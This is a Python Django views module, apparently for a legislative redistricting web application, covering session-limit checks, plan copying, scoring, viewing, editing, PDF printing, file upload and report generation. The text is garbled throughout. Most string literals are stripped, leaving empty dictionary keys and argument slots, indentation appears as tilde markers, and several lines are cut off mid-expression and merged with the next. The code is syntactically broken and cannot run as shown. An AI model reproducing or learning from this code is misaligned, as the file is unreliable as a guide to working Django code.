if in decoded and decoded [ ] == u . id : \n 
~~~ websession = SessionStore ( session_key = session . session_key ) \n 
websession [ ] = count \n 
websession . save ( ) \n 
~~ ~~ except SuspiciousOperation : \n 
~~~ logger . debug ( "SuspiciousOperation caught while setting the session count on all user sessions. Session key: %s" \n 
~~ ~~ return ( count <= 1 ) \n 
\n 
~~ def unique_session_or_json_redirect ( function ) : \n 
~~~ """ \n    A decorator method.  Any method that accepts this decorator\n    should have an HttpRequest as a parameter called "request".\n    That request will be checked for a unique session.  If the\n    test passes, the original method is returned.  If the session\n    is not unique, then a JSON response is returned and the\n    client is redirected to log off.\n    """ \n 
def decorator ( request , * args , ** kwargs ) : \n 
~~~ def return_nonunique_session_result ( ) : \n 
~~~ status = { : False } \n 
status [ ] = _ ( \n 
"The current user may only have one session open at a time." ) \n 
status [ ] = \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not using_unique_session ( request . user ) : \n 
~~~ return return_nonunique_session_result ( ) \n 
~~ else : \n 
~~~ return function ( request , * args , ** kwargs ) \n 
~~ ~~ return wraps ( function ) ( decorator ) \n 
\n 
~~ def is_session_available ( req ) : \n 
~~~ """\n    Determine if a session is available. This is similar to a user test,\n    but requires access to the user\'s session, so it cannot be used in the\n    user_passes_test decorator.\n\n    Parameters:\n        req - The HttpRequest object, with user and session information.\n    """ \n 
if req . user . is_superuser or req . user . is_staff : \n 
~~~ return True \n 
\n 
~~ sessions = Session . objects . filter ( expire_date__gt = datetime . now ( ) ) \n 
count = 0 \n 
for session in sessions : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
if ( not req . user . is_anonymous ( ) ) and in decoded and decoded [ ~~~ count += 1 \n 
~~ ~~ except SuspiciousOperation : \n 
~~~ logger . debug ( "SuspiciousOperation caught while checking the last activity time in a user\'s session. Session key: %s" \n 
~~ ~~ avail = count < settings . CONCURRENT_SESSIONS \n 
req . session [ ] = avail \n 
\n 
return avail \n 
\n 
~~ def note_session_activity ( req ) : \n 
~~~ """\n    Add a session \'timeout\' whenever a user performs an action. This is \n    required to keep dormant (not yet expired, but inactive) sessions\n    from maxing out the concurrent session limit.\n\n    Parameters:\n        req - An HttpRequest, with a session attribute\n    """ \n 
# The timeout in this timedelta specifies the number of minutes. \n 
window = timedelta ( 0 , 0 , 0 , 0 , settings . SESSION_TIMEOUT ) \n 
req . session [ ] = datetime . now ( ) + window \n 
\n 
\n 
~~ @ login_required \n 
def unloadplan ( request , planid ) : \n 
~~~ """\n    Unload a plan.\n\n    This view is called anytime a plan is unloaded. Example: navigating\n    away from the page, or selecting a new plan. This method allows\n    for any required plan cleanup such as purging temporary versions.\n\n    Parameters:\n        request -- The HttpRequest, which includes the user.\n        planid -- The plan to unload.\n\n    Returns:\n        A JSON HttpResponse which includes a status.\n    """ \n 
note_session_activity ( request ) \n 
status = { : False } \n 
\n 
ps = Plan . objects . filter ( pk = planid ) \n 
if len ( ps ) > 0 : \n 
~~~ p = ps [ 0 ] \n 
\n 
if not can_copy ( request . user , p ) : \n 
~~~ status [ ] = _ ( "User %(user)s doesn\'t have permission to unload this plan" ) % { return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Purge temporary versions \n 
~~ if settings . MAX_UNDOS_AFTER_EDIT > 0 : \n 
~~~ p . purge_beyond_nth_step ( settings . MAX_UNDOS_AFTER_EDIT ) \n 
\n 
~~ ~~ status [ ] = True \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def copyplan ( request , planid ) : \n 
~~~ """\n    Copy a plan to a new, editable plan.\n\n    This view is called by the plan chooser and the share plan tab. These\n    actions take a template or shared plan, and copy the plan without its\n    history into an editable plan in the current user\'s account.\n\n    Parameters:\n        request -- The HttpRequest, which includes the user.\n        planid -- The original plan to copy.\n\n    Returns:\n        A JSON HttpResponse which includes either an error message or the\n        copied plan ID.\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not is_plan_ready ( planid ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ status = { : False } \n 
p = Plan . objects . get ( pk = planid ) \n 
# Check if this plan is copyable by the current user. \n 
if not can_copy ( request . user , p ) : \n 
~~~ status [ ] = _ ( "User %(username)s doesn\'t have permission to " "copy this model" % { : request . user . username } ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Create a random name if there is no name provided \n 
~~ newname = p . name + " " + str ( random . random ( ) ) \n 
if ( request . method == "POST" ) : \n 
~~~ newname = request . POST [ "name" ] [ 0 : 200 ] \n 
shared = request . POST . get ( "shared" , False ) \n 
\n 
~~ plan_copy = Plan . objects . filter ( name = newname , owner = request . user , legislative_body = p . legislative_body \n 
if len ( plan_copy ) > 0 : \n 
~~~ status [ ] = _ ( "You already have a plan named that. " "Please pick a unique name." ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ plan_copy = Plan ( name = newname , owner = request . user , is_shared = shared , legislative_body = p . legislative_body plan_copy . create_unassigned = False \n 
plan_copy . save ( ) \n 
\n 
# Get all the districts in the original plan at the most recent version \n 
# of the original plan. \n 
districts = p . get_districts_at_version ( p . version , include_geom = True ) \n 
for district in districts : \n 
~~~ district_copy = copy . copy ( district ) \n 
\n 
district_copy . id = None \n 
district_copy . version = 0 \n 
district_copy . is_locked = False \n 
district_copy . plan = plan_copy \n 
\n 
try : \n 
~~~ district_copy . save ( ) \n 
~~ except Exception as inst : \n 
~~~ status [ "message" ] = _ ( "Could not save district copies" ) \n 
status [ "exception" ] = inst . message \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# clone the characteristics, comments, and tags from the original  \n 
# district to the copy  \n 
~~ district_copy . clone_relations_from ( district ) \n 
\n 
# Serialize the plan object to the response. \n 
~~ data = serializers . serialize ( "json" , [ plan_copy ] ) \n 
\n 
return HttpResponse ( data , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def scoreplan ( request , planid ) : \n 
~~~ """\n    Validate a plan to allow for it to be shown in the leaderboard\n\n    Parameters:\n        request -- The HttpRequest, which includes the user.\n        planid -- The plan to score.\n\n    Returns:\n        A JSON HttpResponse which includes a status, and if applicable,\n        a reason why the plan couldn\'t be validated\n    """ \n 
note_session_activity ( request ) \n 
status = { : False } \n 
plan = Plan . objects . get ( pk = planid ) \n 
\n 
criterion = ValidationCriteria . objects . filter ( legislative_body = plan . legislative_body ) \n 
status [ ] = True \n 
for criteria in criterion : \n 
~~~ try : \n 
~~~ score = ComputedPlanScore . compute ( criteria . function , plan ) \n 
~~ except : \n 
~~~ logger . debug ( traceback . format_exc ( ) ) \n 
\n 
~~ if not score or not score [ ] : \n 
~~~ status [ ] = False \n 
status [ ] = % ( criteria . get_short_label ( ) , criteria . get_long_description break \n 
\n 
~~ ~~ if status [ ] : \n 
~~~ status [ ] = True \n 
status [ ] = _ ( "Validation successful" ) \n 
\n 
# Set is_valid status on the plan \n 
plan . is_valid = True \n 
plan . save ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ def get_user_info ( user ) : \n 
~~~ """\n    Get extended user information for the current user.\n\n    Parameters:\n        user -- The user attached to the HttpRequest\n\n    Returns:\n        A dict with user information, including profile information.\n    """ \n 
if user . is_anonymous ( ) : \n 
~~~ return None \n 
\n 
~~ profile = user . get_profile ( ) \n 
\n 
return { \n 
: user . username , \n 
: user . email , \n 
: profile . pass_hint , \n 
: user . first_name , \n 
: user . last_name , \n 
: profile . organization , \n 
: user . id \n 
} \n 
\n 
~~ def commonplan ( request , planid ) : \n 
~~~ """\n    A common method that gets the same data structures for viewing\n    and editing. This method is called by the viewplan and editplan \n    views.\n    \n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan ID to fetch.\n        \n    Returns:\n        A python dict with common plan attributes set to the plan\'s values.\n    """ \n 
note_session_activity ( request ) \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
plan . edited = getutc ( plan . edited ) \n 
levels = plan . legislative_body . get_geolevels ( ) \n 
districts = plan . get_districts_at_version ( plan . version , include_geom = False ) \n 
editable = can_edit ( request . user , plan ) \n 
default_demo = plan . legislative_body . get_default_subject ( ) \n 
max_dists = plan . legislative_body . max_districts \n 
body_member_short_label = plan . legislative_body . get_short_label ( ) \n 
body_member_long_label = plan . legislative_body . get_label ( ) \n 
body_members = plan . legislative_body . get_members_label ( ) \n 
reporting_template = % plan . legislative_body . name if not plan . is_community ( ) \n 
index = body_member_short_label . find ( ) \n 
if index >= 0 : \n 
~~~ body_member_short_label = body_member_short_label [ 0 : index ] \n 
~~ index = body_member_long_label . find ( ) \n 
if index >= 0 : \n 
~~~ body_member_long_label = body_member_long_label [ 0 : index ] \n 
~~ if not editable and not can_view ( request . user , plan ) : \n 
~~~ plan = { } \n 
tags = [ ] \n 
calculator_reports = [ ] \n 
~~ else : \n 
~~~ tags = Tag . objects . filter ( name__startswith = ) . order_by ( ) . values_list ( , flat tags = map ( lambda x : x [ 5 : ] , tags ) \n 
\n 
# Reports defined with calculators (Score Displays, Panels, and Functions) \n 
# result is a map of relevant panels to score functions with labels and ids, \n 
# used for generating groups of checkboxes on the evaluate tab. \n 
calculator_reports = [ ] \n 
if settings . REPORTS_ENABLED == : \n 
~~~ report_displays = ScoreDisplay . objects . filter ( name = "%s_reports" % plan . legislative_body if len ( report_displays ) > 0 : \n 
~~~ calculator_reports = map ( lambda p : { \n 
: p . __unicode__ ( ) , \n 
: map ( lambda f : { \n 
: f . get_label ( ) , \n 
: f . id \n 
} , p . score_functions . all ( ) . filter ( selectable_bodies = plan . legislative_body } , report_displays [ 0 ] . scorepanel_set . all ( ) . order_by ( ) ) \n 
\n 
~~ ~~ ~~ ~~ else : \n 
\n 
~~~ plan = { } \n 
levels = list ( ) \n 
districts = { } \n 
editable = False \n 
default_demo = None \n 
max_dists = 0 \n 
body_member_short_label = \n 
body_member_long_label = _ ( ) + \n 
body_members = _n ( , , 2 ) \n 
reporting_template = None \n 
tags = [ ] \n 
calculator_reports = [ ] \n 
~~ demos = Subject . objects . all ( ) . order_by ( ) [ 0 : 3 ] \n 
layers = [ ] \n 
snaplayers = [ ] \n 
\n 
if len ( levels ) > 0 : \n 
~~~ study_area_extent = list ( levels [ 0 ] . geounit_set . extent ( field_name = ) ) \n 
~~ else : \n 
# The geolevels with higher indexes are larger geography \n 
# Cycle through legislative bodies, since they may be in different regions \n 
~~~ for lb in LegislativeBody . objects . all ( ) : \n 
~~~ biglevel = lb . get_geolevels ( ) [ 0 ] \n 
if biglevel . geounit_set . count ( ) > 0 : \n 
~~~ study_area_extent = biglevel . geounit_set . extent ( field_name = ) \n 
break \n 
\n 
~~ ~~ ~~ for level in levels : \n 
# i18n-ize name here, not in js \n 
~~~ snaplayers . append ( { \n 
: level . id , \n 
: level . name , \n 
: + level . name , \n 
: level . get_long_description ( ) , \n 
: level . min_zoom \n 
} ) \n 
~~ default_selected = False \n 
for demo in demos : \n 
~~~ isdefault = str ( ( not default_demo is None ) and ( demo . id == default_demo . id ) ) . lower ( ) \n 
if isdefault == : \n 
~~~ default_selected = True \n 
# i18n-ize name & short_display here, not in js \n 
~~ layers . append ( { \n 
: demo . id , \n 
: demo . get_short_label ( ) , \n 
: demo . name , \n 
: isdefault , \n 
: str ( demo . is_displayed ) . lower ( ) \n 
} ) \n 
~~ if default_demo and not default_selected : \n 
~~~ layers . insert ( 0 , { \n 
: default_demo . id , \n 
: default_demo . get_short_label ( ) , \n 
: default_demo . name , \n 
: str ( True ) . lower ( ) , \n 
: str ( default_demo . is_displayed ) . lower ( ) \n 
} ) \n 
\n 
# Try to get the mapserver protocol from the settings module. \n 
\n 
# front-end Javascript will set a reasonable default (currently \n 
# the same protocol as the request to the webserver). \n 
~~ if in settings . __members__ : \n 
~~~ mapserver_protocol = settings . MAP_SERVER_PROTOCOL \n 
~~ else : \n 
~~~ mapserver_protocol = \n 
\n 
~~ short_label = body_member_short_label . strip ( ) . lower ( ) \n 
long_label = body_member_long_label . strip ( ) . lower ( ) \n 
\n 
has_regions = Region . objects . all ( ) . count ( ) > 1 \n 
bodies = LegislativeBody . objects . all ( ) . order_by ( , ) \n 
l_bodies = [ b for b in bodies if b in [ sd . legislative_body for sd in ScoreDisplay . objects . filter \n 
try : \n 
~~~ loader . get_template ( reporting_template ) \n 
~~ except : \n 
~~~ reporting_template = None \n 
\n 
~~ return RequestContext ( request , { \n 
: bodies , \n 
: has_regions , \n 
: l_bodies , \n 
: plan , \n 
: districts , \n 
: settings . MAP_SERVER , \n 
: mapserver_protocol , \n 
: settings . BASE_MAPS , \n 
: settings . MAP_SERVER_NS , \n 
: settings . MAP_SERVER_NSHREF , \n 
: settings . FEATURE_LIMIT , \n 
: settings . ADJACENCY , \n 
: settings . CONVEX_CHOROPLETH , \n 
: layers , \n 
: snaplayers , \n 
: UNASSIGNED_DISTRICT_ID , \n 
: request . user . username != and request . user . username != , \n 
: settings . DEBUG and request . user . is_staff , \n 
: get_user_info ( request . user ) , \n 
: editable , \n 
: max_dists + 1 , \n 
: settings . GA_ACCOUNT , \n 
: settings . GA_DOMAIN , \n 
: short_label , \n 
: long_label , \n 
: body_members , \n 
: reporting_template , \n 
: study_area_extent , \n 
: len ( ScoreDisplay . objects . filter ( is_page = True ) ) > 0 , \n 
: json . dumps ( calculator_reports ) , \n 
: ( in settings . __members__ ) , \n 
: tags , \n 
: Site . objects . get_current ( ) , \n 
: _ ( "community map" ) if ( plan and plan . is_community ( ) ) else _ ( "plan" ) , \n 
: translation . get_language ( ) , \n 
: settings . LANGUAGES # needed (as CAPS) for language chooser \n 
} ) \n 
\n 
~~ def is_plan_ready ( planid ) : \n 
~~~ """\n    Determines if a plan is in a Ready state\n    """ \n 
planid = int ( planid ) \n 
return planid == 0 or len ( Plan . objects . filter ( id = planid , processing_state = ProcessingState . READY ) \n 
~~ @ user_passes_test ( using_unique_session ) \n 
def viewplan ( request , planid ) : \n 
~~~ """\n    View a plan. \n    \n    This template has no editing capability.\n    \n    Parameters:\n        request -- An HttpRequest, which includes the current user.\n        planid -- The plan to view\n\n    Returns:\n        A rendered HTML page for viewing a plan.\n    """ \n 
\n 
if not is_session_available ( request ) or not is_plan_ready ( planid ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
# Cleanup old versions for logged in users \n 
~~ if not request . user . is_anonymous ( ) and ( int ( planid ) == 0 ) and ( settings . MAX_UNDOS_AFTER_EDIT > 0 ~~~ for p in Plan . objects . filter ( owner = request . user ) : \n 
~~~ p . purge_beyond_nth_step ( settings . MAX_UNDOS_AFTER_EDIT ) \n 
\n 
~~ ~~ return render_to_response ( , commonplan ( request , planid ) ) \n 
\n 
\n 
~~ @ user_passes_test ( using_unique_session ) \n 
def editplan ( request , planid ) : \n 
~~~ """\n    Edit a plan. \n    \n    This template enables editing tools and functionality.\n    \n    Parameters:\n        request -- An HttpRequest, which includes the current user.\n        planid -- The plan to edit.\n\n    Returns:\n        A rendered HTML page for editing a plan.\n    """ \n 
if request . user . is_anonymous ( ) or not is_session_available ( request ) or not is_plan_ready ( planid ) ~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ cfg = commonplan ( request , planid ) \n 
if cfg [ ] == False : \n 
~~~ return HttpResponseRedirect ( % planid ) \n 
~~ plan = Plan . objects . get ( id = planid , owner = request . user ) \n 
cfg [ ] = len ( cfg [ ] ) > plan . legislative_body . max_districts \n 
cfg [ ] = plan . get_available_districts ( ) \n 
\n 
# Cleanup old versions \n 
if settings . MAX_UNDOS_AFTER_EDIT > 0 : \n 
~~~ plan . purge_beyond_nth_step ( settings . MAX_UNDOS_AFTER_EDIT ) \n 
\n 
~~ return render_to_response ( , cfg ) \n 
\n 
~~ @ user_passes_test ( using_unique_session ) \n 
def printplan ( request , planid ) : \n 
~~~ """\n    Print a static map of a plan.\n    \n    This template renders a static HTML document for use with xhtml2pdf.\n    \n    Parameters:\n        request -- An HttpRequest, which includes the current user.\n        planid -- The plan to edit.\n        \n    Returns:\n        A rendered HTML page suitable for conversion to a PDF.\n    """ \n 
if not is_session_available ( request ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ cfg = commonplan ( request , planid ) \n 
\n 
sha = hashlib . sha1 ( ) \n 
sha . update ( str ( planid ) + str ( datetime . now ( ) ) ) \n 
cfg [ ] = % sha . hexdigest ( ) \n 
cfg [ ] = % request . META [ ] \n 
\n 
if request . method == : \n 
~~~ if not in request . REQUEST or not in request . REQUEST or not in request . REQUEST or not in request . REQUEST or not in request . REQUEST : \n 
~~~ logger . warning ( \'Missing required "bbox", "geography_url", "geography_lyr", "district_url", or "districts_lyr" parameter.\' return HttpResponseRedirect ( ) \n 
\n 
~~ height = 500 * 2 \n 
if in request . REQUEST : \n 
~~~ height = int ( request . REQUEST [ ] ) * 2 \n 
~~ width = 1024 * 2 \n 
if in request . REQUEST : \n 
~~~ width = int ( request . REQUEST [ ] ) * 2 \n 
~~ opacity = 0.8 \n 
if in request . REQUEST : \n 
~~~ opacity = float ( request . REQUEST [ ] ) \n 
\n 
~~ full_legend = json . loads ( request . REQUEST [ ] ) \n 
\n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = Plan . objects . get ( id = int ( request . REQUEST [ ] ) ) \n 
cfg [ ] = datetime . now ( ) \n 
\n 
# use modestmaps to get the basemap \n 
bbox = request . REQUEST [ ] . split ( ) \n 
\n 
pt1 = Point ( float ( bbox [ 0 ] ) , float ( bbox [ 1 ] ) , srid = 3785 ) \n 
pt1 . transform ( SpatialReference ( ) ) \n 
ll = ModestMaps . Geo . Location ( pt1 . y , pt1 . x ) \n 
\n 
pt2 = Point ( float ( bbox [ 2 ] ) , float ( bbox [ 3 ] ) , srid = 3785 ) \n 
pt2 . transform ( SpatialReference ( ) ) \n 
ur = ModestMaps . Geo . Location ( pt2 . y , pt2 . x ) \n 
\n 
dims = ModestMaps . Core . Point ( width , height ) \n 
provider = ModestMaps . OpenStreetMap . Provider ( ) \n 
basemap = ModestMaps . mapByExtent ( provider , ll , ur , dims ) \n 
\n 
# create basemap for compositing \n 
fullImg = basemap . draw ( ) \n 
\n 
\n 
# geography layer \n 
provider = ModestMaps . WMS . Provider ( cfg [ ] , { \n 
: cfg [ ] , \n 
: , \n 
: , \n 
: 512 , \n 
: 512 \n 
} ) \n 
overlayImg = ModestMaps . mapByExtent ( provider , ll , ur , dims ) . draw ( ) \n 
\n 
# create an invert mask of the geography \n 
maskImg = ImageChops . invert ( overlayImg ) \n 
\n 
\n 
# district fill layer \n 
provider = ModestMaps . WMS . Provider ( cfg [ ] , { \n 
: cfg [ ] , \n 
: , \n 
: , \n 
: request . REQUEST [ ] , \n 
: 512 , \n 
: 512 \n 
} ) \n 
overlayImg = Image . blend ( overlayImg , ModestMaps . mapByExtent ( provider , ll , ur , dims ) . draw ( ) , \n 
# composite the overlay onto the base, using the mask (from geography) \n 
fullImg = Image . composite ( fullImg , Image . blend ( fullImg , overlayImg , opacity ) , maskImg ) \n 
\n 
\n 
# district line & label layer \n 
provider = ModestMaps . WMS . Provider ( cfg [ ] , { \n 
: cfg [ ] , \n 
: , \n 
: , \n 
: request . REQUEST [ ] , \n 
: 512 , \n 
: 512 \n 
} ) \n 
overlayImg = ModestMaps . mapByExtent ( provider , ll , ur , dims ) . draw ( ) \n 
\n 
# create an invert mask of the labels & lines \n 
maskImg = ImageChops . invert ( overlayImg ) \n 
\n 
# composite the district labels on top of the composited basemap, geography & district areas fullImg = Image . composite ( fullImg , Image . blend ( fullImg , overlayImg , opacity ) , maskImg ) \n 
\n 
# save \n 
fullImg . save ( settings . WEB_TEMP + ( % sha . hexdigest ( ) ) , , quality = 100 ) \n 
\n 
# render pg to a string \n 
t = loader . get_template ( ) \n 
page = t . render ( DjangoContext ( cfg ) ) \n 
result = StringIO . StringIO ( ) \n 
\n 
\n 
# as allowing the method to set an encoding itself fixes the problem. \n 
# we may need to find an alternate strategy if it finds encodings that \n 
\n 
CreatePDF ( page , result , show_error_as_pdf = True ) \n 
\n 
response = HttpResponse ( result . getvalue ( ) , mimetype = ) \n 
response [ ] = \n 
\n 
return response \n 
\n 
~~ else : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ ~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def createplan ( request ) : \n 
~~~ """\n    Create a plan.\n\n    Create a plan from a POST request. This plan will be \'blank\', and will\n    contain only the Unassigned district initially.\n\n    Parameters:\n        request -- An HttpRequest, which contains the current user.\n\n    Returns:\n        A JSON HttpResponse, including the new plan\'s information, or an\n        error describing why the plan could not be created.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method == "POST" : \n 
~~~ name = request . POST [ ] [ 0 : 200 ] \n 
body = LegislativeBody . objects . get ( id = int ( request . POST [ ] ) ) \n 
plan = Plan ( name = name , owner = request . user , legislative_body = body , processing_state = ProcessingState try : \n 
~~~ plan . save ( ) \n 
status = serializers . serialize ( "json" , [ plan ] ) \n 
~~ except : \n 
~~~ status = { : False , : _ ( "Couldn\'t save new plan" ) } \n 
~~ ~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def uploadfile ( request ) : \n 
~~~ """\n    Accept a block equivalency file, and create a plan based on that\n    file.\n\n    Parameters:\n        request -- An HttpRequest, with a file upload and plan name.\n\n    Returns:\n        A plan view, with additional information about the upload status.\n    """ \n 
note_session_activity ( request ) \n 
\n 
if request . user . is_anonymous ( ) : \n 
# If a user is logged off from another location, they will appear \n 
# as an anonymous user. Redirect them to the front page. Sadly, \n 
# they will not get a notice that they were logged out. \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ status = commonplan ( request , 0 ) \n 
status [ ] = True \n 
status [ ] = True \n 
\n 
index_file = request . FILES . get ( , False ) \n 
if not index_file : \n 
~~~ status [ ] = False \n 
return render_to_response ( , status ) \n 
~~ else : \n 
~~~ filename = index_file . name \n 
\n 
~~ if index_file . size > settings . MAX_UPLOAD_SIZE : \n 
~~~ logger . error ( ) \n 
status [ ] = False \n 
return render_to_response ( , status ) \n 
\n 
~~ if not filename . endswith ( ( , ) ) : \n 
~~~ logger . error ( \'Uploaded file must be ".csv" or ".zip".\' ) \n 
status [ ] = False \n 
~~ elif request . POST [ ] == : \n 
~~~ logger . error ( ) \n 
status [ ] = False \n 
~~ else : \n 
~~~ try : \n 
~~~ dest = tempfile . NamedTemporaryFile ( mode = , delete = False ) \n 
for chunk in request . FILES [ ] . chunks ( ) : \n 
~~~ dest . write ( chunk ) \n 
~~ dest . close ( ) \n 
if request . FILES [ ] . name . endswith ( ) : \n 
~~~ os . rename ( dest . name , % ( dest . name , ) ) \n 
filename = % ( dest . name , ) \n 
~~ else : \n 
~~~ filename = dest . name \n 
\n 
~~ ~~ except Exception as ex : \n 
~~~ logger . error ( ) \n 
logger . error ( , ex ) \n 
status [ ] = False \n 
return render_to_response ( , status ) \n 
\n 
# Put in a celery task to create the plan and email user on completion \n 
~~ DistrictIndexFile . index2plan . delay ( request . POST [ ] , request . POST [ \n 
~~ return render_to_response ( , status ) \n 
\n 
~~ def generate_report_hash ( qdict ) : \n 
~~~ """\n    Generate a hash based on the query items passed to this report request.\n    """ \n 
\n 
params = qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) + qdict . get ( , ) \n 
sha = hashlib . sha1 ( ) \n 
sha . update ( params ) \n 
return sha . hexdigest ( ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getreport ( request , planid ) : \n 
~~~ """\n    Get a BARD report.\n\n    This view will write out an HTML-formatted BARD report to the directory\n    given in the settings.\n    \n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan to be reported.\n    \n    Returns:\n        The HTML for use as a preview in the web application, along with \n        the web address of the BARD report.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_view ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not settings . REPORTS_ENABLED is None : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the variables from the request \n 
~~ if request . method != : \n 
~~~ status [ ] = _ ( "Information for report wasn\'t sent via POST" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ stamp = request . POST . get ( , generate_report_hash ( request . POST ) ) \n 
\n 
rptstatus = PlanReport . checkreport ( planid , stamp ) \n 
if rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: PlanReport . getreport ( planid , stamp ) , \n 
: 0 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getreport , args = [ planid ] ) , \n 
: 10 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getreport , args = [ planid ] ) , \n 
: 10 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
\n 
req = { \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . getlist ( ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) , \n 
: request . POST . get ( , ) \n 
} \n 
\n 
PlanReport . markpending ( planid , stamp ) \n 
PlanReport . createreport . delay ( planid , stamp , req , language = translation . get_language ( ) ) \n 
~~ else : \n 
~~~ status [ ] = _ ( \n 
) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getcalculatorreport ( request , planid ) : \n 
~~~ """\n    Get a report which is generated by using calculators.\n\n    This view will write out an HTML-formatted report to the directory\n    given in the settings.\n    \n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan to be reported.\n    \n    Returns:\n        The HTML for use as a preview in the web application, along with \n        the web address of the report.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_view ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if request . method != : \n 
~~~ status [ ] = _ ( "Information for report wasn\'t sent via POST" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# extract the function ids from the POST \n 
~~ function_ids = request . POST . get ( , ) \n 
\n 
# generate a hash of the function ids \n 
sha = hashlib . sha1 ( ) \n 
sha . update ( function_ids ) \n 
stamp = request . POST . get ( , sha . hexdigest ( ) ) \n 
\n 
rptstatus = CalculatorReport . checkreport ( planid , stamp ) \n 
if rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: CalculatorReport . getreport ( planid , stamp ) , \n 
: 0 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getcalculatorreport , args = [ planid ] ) , \n 
: 5 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
~~ elif rptstatus == : \n 
~~~ status = { \n 
: True , \n 
: reverse ( getcalculatorreport , args = [ planid ] ) , \n 
: 5 , \n 
: _ ( ) , \n 
: stamp \n 
} \n 
\n 
req = { : function_ids } \n 
CalculatorReport . markpending ( planid , stamp ) \n 
CalculatorReport . createcalculatorreport . delay ( planid , stamp , req , language = translation . get_language ~~ else : \n 
~~~ status [ ] = _ ( \n 
) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def newdistrict ( request , planid ) : \n 
~~~ """\n    Create a new district.\n\n    The \'geolevel\' parameter is required to create a new district. Geounits\n    may be added to this new district by setting the \'geounits\' key in the\n    request.  \n\n    Parameters:\n        request - An HttpRequest, with the current user.\n        planid - The plan id to which the district should be added.\n    \n    Returns:\n        The new District\'s name and district_id.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if len ( request . REQUEST . items ( ) ) >= 3 : \n 
~~~ plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
\n 
if in request . REQUEST : \n 
~~~ geolevel = request . REQUEST [ ] \n 
~~ else : \n 
~~~ geolevel = None \n 
~~ if in request . REQUEST : \n 
~~~ geounit_ids = string . split ( request . REQUEST [ ] , ) \n 
~~ else : \n 
~~~ geounit_ids = None \n 
\n 
~~ if in request . REQUEST : \n 
~~~ district_id = int ( request . REQUEST [ ] ) \n 
~~ else : \n 
~~~ district_id = None \n 
\n 
